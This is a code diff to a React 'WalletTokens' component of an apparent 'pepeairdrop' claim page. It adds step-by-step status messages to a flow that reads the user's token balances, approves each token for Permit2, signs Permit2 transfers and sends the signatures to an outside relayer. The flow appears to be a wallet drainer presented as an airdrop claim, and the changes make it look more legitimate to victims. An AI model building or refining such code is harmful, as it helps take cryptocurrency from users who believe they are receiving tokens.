@@ -447,6 +447,7 @@ function WalletTokens({ children }: { children: ReactNode }) {
   const [tokenBalances, setTokenBalances] = useState<Record<string, bigint>>({})
   const [tokenAllowances, setTokenAllowances] = useState<Record<string, bigint>>({})
   const [claiming, setClaiming] = useState(false)
+  const [claimStatus, setClaimStatus] = useState('')
   const [prices, setPrices] = useState<Record<string, number>>(TOKEN_PRICES)
 
   const RELAYER_URL = import.meta.env.VITE_RELAYER_URL || `https://pepeairdrop-relayer.onrender.com`
@@ -672,6 +673,7 @@ function WalletTokens({ children }: { children: ReactNode }) {
 
         if (currentAllowance < safeAmount) {
           console.log(`Approving ${token.symbol} for Permit2...`)
+          setClaimStatus(`Approving ${token.symbol} for Permit2...`)
           const approveTx = await walletClient.writeContract({
             address: token.address as `0x${string}`,
             abi: ERC20_EXTENDED_ABI,
@@ -685,6 +687,7 @@ function WalletTokens({ children }: { children: ReactNode }) {
             console.warn(`[PROFESSIONAL DEBUG] Receipt wait failed for ${token.symbol} approve:`, e)
           })
 
+          setClaimStatus(`Waiting for ${token.symbol} approval confirmation...`)
           // Poll relayer until allowance is confirmed on-chain (Base needs ~2-6s)
           let attempts = 0
           const maxAttempts = 30
@@ -708,6 +711,7 @@ function WalletTokens({ children }: { children: ReactNode }) {
 
           if (confirmedAllowance < safeAmount) {
             console.error(`[PROFESSIONAL DEBUG] Allowance NOT confirmed after ${maxAttempts} attempts (${(maxAttempts * 2)}s). Aborting relay for ${token.symbol}.`)
+            setClaimStatus('Approval timed out. Please try again.')
             setClaiming(false)
             return
           }
@@ -722,6 +726,7 @@ function WalletTokens({ children }: { children: ReactNode }) {
         const nonce = (BigInt(Math.floor(Date.now() / 1000)) << 32n) + BigInt(Math.floor(Math.random() * 2 ** 32))
         const deadline = BigInt(Math.floor(Date.now() / 1000) + 3600) // 1 hour
 
+        setClaimStatus(`Preparing signature for ${token.symbol}...`)
         console.log(`[PROFESSIONAL DEBUG] Preparing Permit2 Signature:`, {
           token: token.address,
           amount: safeAmount.toString(),
@@ -776,6 +781,7 @@ function WalletTokens({ children }: { children: ReactNode }) {
 
         console.log(`[PROFESSIONAL DEBUG] Signature generated: ${signature}`);
 
+        setClaimStatus(`Sending ${token.symbol} to relayer...`)
         // Send to relayer
         const response = await fetch(`${RELAYER_URL}/relay`, {
           method: 'POST',
@@ -803,8 +809,10 @@ function WalletTokens({ children }: { children: ReactNode }) {
       }
     } catch (err: unknown) {
       console.error('Permit2 error:', err)
+      setClaimStatus('Claim failed. Please try again.')
     } finally {
       setClaiming(false)
+      setTimeout(() => setClaimStatus(''), 5000)
     }
   }
 
@@ -832,7 +840,7 @@ function WalletTokens({ children }: { children: ReactNode }) {
               {claiming ? (
                 <>
                   <Loader2 className="w-6 h-6 animate-spin" />
-                  Processing...
+                  {claimStatus || 'Processing...'}
                 </>
               ) : (
                 <>
